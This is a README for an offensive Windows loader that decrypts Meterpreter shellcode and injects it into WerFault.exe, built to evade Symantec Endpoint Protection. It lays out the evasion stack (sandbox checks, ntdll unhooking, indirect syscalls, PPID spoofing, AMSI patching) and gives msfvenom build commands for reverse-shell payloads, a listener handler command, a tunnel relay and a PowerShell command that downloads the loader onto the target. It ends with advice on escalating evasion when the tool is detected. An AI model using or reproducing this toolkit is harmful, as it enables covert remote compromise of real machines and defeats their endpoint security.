# SEP Evasion Loader

x64 Windows loader that decrypts AES-256-CBC shellcode and injects it via
early-bird APC into `WerFault.exe`, built to evade Symantec Endpoint
Protection 14.x (SysPlant userland hooks, SONAR behavioral engine, AMSI
provider, static/reputation scanning).

**Status:** static-verified and parser-validated on Linux. Runtime behavior
against a live SEP install must be validated on the target (see *Testing*).

---

## Technique stack

| # | Layer | Countermeasure |
|---|-------|----------------|
| 1 | Sandbox/emulation | RAM <3.5GB, CPU <2, disk <60GB, uptime <10min, proc count <40, `BeingDebugged` + `ProcessDebugPort` → silent exit |
| 2 | SysPlant ntdll hooks | **HalosGate** — syscall numbers resolved from a *clean* ntdll.dll read from disk (hooks only exist in the in-memory copy) |
| 3 | SysPlant ntdll hooks | **perfow unhook** — clean `.text` mapped over the live hooked copy |
| 4 | API monitoring / ETW | **Indirect syscalls** — `mov r10,rcx; mov eax,SSN; jmp [clean syscall;ret gadget]`, no `syscall` from our module after unhook |
| 5 | Static scan | AES-256-CBC payload via OS BCrypt; random key/IV per build (polymorphic); XOR-obfuscated string tables (IPA constant-folding defeated with `noinline` + volatile decode + `-fno-merge-constants`) |
| 6 | Reputation heuristics | WerFault version-info resource; benign import table (no `WriteProcessMemory`/`VirtualAllocEx`/`CreateRemoteThread`/`GetProcAddress`) |
| 7 | SONAR (injection) | PPID spoof to `explorer.exe` → `CreateProcessW(WerFault.exe, SUSPENDED)` → `NtAllocateVirtualMemory`/`NtWriteVirtualMemory`/`NtProtectVirtualMemory`/`NtQueueApcThread`/`NtResumeThread`, all via indirect syscalls |
| 8 | AMSI provider | Remote patch of `AmsiScanBuffer` (`mov eax,0x80070057; ret`) inside the injected process at +2.5s and +15s (post-exploitation PowerShell/.NET stays unscanned) |

## Requirements

- Kali: `x86_64-w64-mingw32-gcc`, `x86_64-w64-mingw32-windres`, `msfvenom`, `python3` + `cryptography` (`pip3 install cryptography`)
- Target: Windows 10/11 or Server 2016+ x64 with SEP

## Build

```bash
./build.sh [LHOST] [LPORT] [PAYLOAD]
```

Defaults: `LHOST` = auto-detected from `tun0`/`eth0`, `LPORT` = `443`,
`PAYLOAD` = `windows/x64/meterpreter_reverse_https`.

**LHOST must be reachable from the target.** With a NAT'd attacker box:

```bash
# relay: cloudflared prints a public endpoint, payload calls that, tunnel lands on Kali
cloudflared tunnel --url tcp://localhost:4444
./build.sh <printed-host> <printed-port> windows/x64/meterpreter_reverse_tcp
```

Bind alternative (target listens on its own public IP, Kali connects out):

```bash
./build.sh <unused> 8080 windows/x64/meterpreter_bind_tcp
```

Outputs: `shellcode.bin` (raw), `payload.h` (AES-encrypted + key/IV), `sep_loader.exe`,
plus SHA-256 hashes and a static plaintext-string check.

## Handler

```bash
msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 0.0.0.0; set LPORT 443; set EXITFUNC thread; run'
```

For bind payloads add `set RHOST <target public IP>`.

## Delivery to target

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/<user>/updates/main/sep_loader.exe" `
  -Headers @{Authorization="token <TOKEN>"} -OutFile C:\Users\Public\updates.exe
```

`certutil -urlcache -split -f` works too but cannot send auth headers —
use it only if the repo is public at pull time.

## Testing against SEP

1. **Baseline:** drop raw `shellcode.bin` on the SEP box → SEP must detect it.
   If it doesn't, the engine is misconfigured and later results are meaningless.
2. **Static:** scan `sep_loader.exe` on disk, run it.
3. **If blocked:** read the SONAR/IPS event category in the SEP console —
   the category tells you which layer caught it, then escalate:
   - Static/WS.Reputation hit → rebuild (new key/IV), tweak version resource
   - SONAR injection pattern → swap APC early-bird for thread hijack or module stomping
   - Memory scan hit → add Ekko-style sleep obfuscation between decrypt and inject
   - AMSI hit post-exploitation → add remote ETW patch (`EtwEventWrite`) alongside AMSI
4. Re-verify with `Get-WinEvent`/Process Monitor that `WerFault.exe` spawned the
   meterpreter thread and the callback reaches the handler.

## Linux-side verification (already green)

```bash
python3 gen_test_pe.py test_ntdll.bin   # craft PE with real ntdll stub patterns
gcc -O2 -o test_parser test_parser.c && ./test_parser test_ntdll.bin   # 8/8 checks
strings -a sep_loader.exe | grep -iE 'werfault|amsi|ntdll\.dll|meterpreter'  # expect nothing
x86_64-w64-mingw32-objdump -p sep_loader.exe   # imports: bcrypt/kernel32/msvcrt only
```

## Files

| File | Purpose |
|------|---------|
| `build.sh` | end-to-end: msfvenom → encrypt → compile → verify |
| `crypt.py` | AES-256-CBC encryption + payload.h emission (self-testing) |
| `sep_loader.c` | the loader |
| `peparse.h` | HalosGate PE parser, shared with the Linux harness |
| `resource.rc` | version-info resource (reputation blend) |
| `gen_test_pe.py` / `test_parser.c` | offline parser validation |
| `shellcode.bin`, `payload.h`, `sep_loader.exe` | build outputs (sensitive) |

## Caveats

- `payload.h` and `sep_loader.exe` contain the encrypted shellcode + key — treat
  like the raw payload; don't leave them in shared locations.
- Each rebuild generates a fresh key/IV and binary hash.
- `_DEBUG` builds (`-D_DEBUG` + remove `-mwindows`) log loader progress via
  `OutputDebugString`.
- Tokens pasted anywhere are burned — rotate after each use.
